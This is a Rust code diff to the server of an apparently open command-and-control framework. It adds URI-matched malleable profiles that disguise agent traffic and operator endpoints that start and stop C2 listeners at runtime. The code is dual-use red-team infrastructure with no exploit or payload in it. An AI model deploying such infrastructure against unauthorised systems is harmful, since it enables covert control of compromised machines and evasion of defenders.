@@ -11,7 +11,7 @@ use serde::Deserialize;
 
 use cloakcat_protocol::{FileChunk, PollResponse, SocksListenerView, TaskType, TunnelData};
 
-
+use crate::config::ListenerEntry;
 use crate::error::ServerError;
 use crate::service;
 use crate::state::AppState;
@@ -85,13 +85,14 @@ pub struct TagsPayload {
 
 // ========== Malleable transform helpers ==========
 
-/// Decode a raw request body using the active malleable profile's POST transform.
+/// Decode a raw request body using the malleable profile matched to `uri`.
 /// Falls back to plain JSON parsing when no transform is active.
 fn decode_body<T: serde::de::DeserializeOwned>(
     state: &AppState,
     bytes: &Bytes,
+    uri: &str,
 ) -> Result<T, ServerError> {
-    let raw: Vec<u8> = match &state.malleable_profile {
+    let raw: Vec<u8> = match state.profile_for_uri(uri) {
         Some(profile) if !profile.http_post.client.output.is_identity() => {
             let s = std::str::from_utf8(bytes)
                 .map_err(|_| ServerError::BadRequest("request body is not valid UTF-8".into()))?;
@@ -105,9 +106,9 @@ fn decode_body<T: serde::de::DeserializeOwned>(
         .map_err(|e| ServerError::BadRequest(format!("JSON parse failed: {e}")))
 }
 
-/// Encode a poll response using the active malleable profile's GET server transform.
+/// Encode a poll response using the malleable profile matched to `uri`.
 /// Returns a plain `axum::response::Response` so the caller can return it directly.
-fn encode_poll(state: &AppState, resp: &PollResponse) -> axum::response::Response {
+fn encode_poll(state: &AppState, resp: &PollResponse, uri: &str) -> axum::response::Response {
     let json = match serde_json::to_vec(resp) {
         Ok(j) => j,
         Err(e) => {
@@ -119,7 +120,7 @@ fn encode_poll(state: &AppState, resp: &PollResponse) -> axum::response::Respons
         }
     };
 
-    if let Some(profile) = &state.malleable_profile {
+    if let Some(profile) = state.profile_for_uri(uri) {
         let transform = &profile.http_get.server.output;
         if !transform.is_identity() {
             match transform.encode(&json) {
@@ -127,13 +128,11 @@ fn encode_poll(state: &AppState, resp: &PollResponse) -> axum::response::Respons
                     let mut builder = axum::http::Response::builder()
                         .status(StatusCode::OK)
                         .header("Content-Type", "text/plain");
-                    // Inject any custom server headers from the profile.
+                    // Inject custom server headers from the profile.
                     for h in &profile.http_get.server.headers {
                         builder = builder.header(h.name.as_str(), h.value.as_str());
                     }
-                    if let Ok(response) =
-                        builder.body(axum::body::Body::from(encoded))
-                    {
+                    if let Ok(response) = builder.body(axum::body::Body::from(encoded)) {
                         return response;
                     }
                 }
@@ -160,11 +159,11 @@ pub async fn register_handler(
     State(state): State<AppState>,
     body: Bytes,
 ) -> Result<Json<serde_json::Value>, ServerError> {
-    let payload: cloakcat_protocol::RegisterReq = decode_body(&state, &body)?;
+    let payload: cloakcat_protocol::RegisterReq = decode_body(&state, &body, uri.path())?;
 
-    // If agent already exists, validate profile match
+    // If agent already exists, validate profile match.
     if let Ok(agent) = service::get_agent(&state, &payload.agent_id).await {
-        validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;
+        validate_profile(agent.profile_name.as_deref(), uri.path(), &headers, &state.profiles)?;
     }
 
     let resp = service::register_agent(&state, &payload).await?;
@@ -179,11 +178,11 @@ pub async fn poll_handler(
     Query(q): Query<HoldParam>,
 ) -> Result<impl IntoResponse, ServerError> {
     let agent = service::get_agent(&state, &agent_id).await?;
-    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;
+    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers, &state.profiles)?;
 
     let hold = q.hold.unwrap_or(0);
     match service::poll_command(&state, &agent_id, hold).await? {
-        Some(resp) => Ok(encode_poll(&state, &resp)),
+        Some(resp) => Ok(encode_poll(&state, &resp, uri.path())),
         None => Ok((StatusCode::NO_CONTENT, Json(serde_json::json!({}))).into_response()),
     }
 }
@@ -195,10 +194,10 @@ pub async fn result_handler(
     State(state): State<AppState>,
     body: Bytes,
 ) -> Result<Json<serde_json::Value>, ServerError> {
-    let req: cloakcat_protocol::ResultReq = decode_body(&state, &body)?;
+    let req: cloakcat_protocol::ResultReq = decode_body(&state, &body, uri.path())?;
 
     let agent = service::get_agent(&state, &agent_id).await?;
-    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;
+    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers, &state.profiles)?;
 
     service::submit_result(&state, &agent, &req).await?;
     Ok(Json(serde_json::json!({ "status": "ok" })))
@@ -384,4 +383,80 @@ pub async fn socks_list_handler(
 ) -> Result<Json<Vec<SocksListenerView>>, ServerError> {
     let list = service::socks_list(&state).await?;
     Ok(Json(list))
+}
+
+// ========== Listener management (operator-facing) ==========
+
+/// GET /v1/admin/listeners — list all active C2 listeners.
+pub async fn admin_listeners_list(
+    State(state): State<AppState>,
+) -> Result<Json<Vec<ListenerEntry>>, ServerError> {
+    let mgr = state.listener_mgr.lock().await;
+    Ok(Json(mgr.list().into_iter().cloned().collect()))
+}
+
+/// POST /v1/admin/listeners — add and start a new C2 listener at runtime.
+pub async fn admin_listeners_add(
+    State(state): State<AppState>,
+    Json(entry): Json<ListenerEntry>,
+) -> Result<Json<serde_json::Value>, ServerError> {
+    // Validate listener type early.
+    if entry.listener_type != "http" && entry.listener_type != "https" {
+        return Err(ServerError::BadRequest(format!(
+            "unknown listener type {:?}; expected \"http\" or \"https\"",
+            entry.listener_type
+        )));
+    }
+
+    {
+        let mgr = state.listener_mgr.lock().await;
+        if mgr.contains(&entry.name) {
+            return Err(ServerError::Conflict(format!(
+                "listener '{}' already running",
+                entry.name
+            )));
+        }
+    }
+
+    // Build a router wired to the current shared state.
+    let app = crate::routes::build_router(state.clone())
+        .layer(axum::extract::DefaultBodyLimit::max(2 * 1024 * 1024));
+
+    let name = entry.name.clone();
+    let cancel = match entry.listener_type.as_str() {
+        "https" => {
+            let cert_cfg = state
+                .profiles
+                .get(&entry.profile)
+                .and_then(|p| p.https_certificate.as_ref());
+            let cert_path = format!("config/certs/{}.pem", entry.profile);
+            let key_path = format!("config/certs/{}_key.pem", entry.profile);
+            let tls_config =
+                crate::tls::ensure_rustls_config(&cert_path, &key_path, cert_cfg, &entry.profile)
+                    .await
+                    .map_err(|e| ServerError::Internal(e))?;
+            crate::listener_mgr::spawn_https(&entry, app, tls_config)
+                .await
+                .map_err(|e| ServerError::Internal(e))?
+        }
+        _ => crate::listener_mgr::spawn_http(&entry, app)
+            .await
+            .map_err(|e| ServerError::Internal(e))?,
+    };
+
+    state.listener_mgr.lock().await.insert(entry, cancel);
+    Ok(Json(serde_json::json!({ "status": "ok", "name": name })))
+}
+
+/// DELETE /v1/admin/listeners/{name} — stop and remove a C2 listener.
+pub async fn admin_listeners_remove(
+    Path(name): Path<String>,
+    State(state): State<AppState>,
+) -> Result<Json<serde_json::Value>, ServerError> {
+    let removed = state.listener_mgr.lock().await.remove(&name);
+    if removed {
+        Ok(Json(serde_json::json!({ "status": "ok", "name": name })))
+    } else {
+        Err(ServerError::NotFound)
+    }
 }
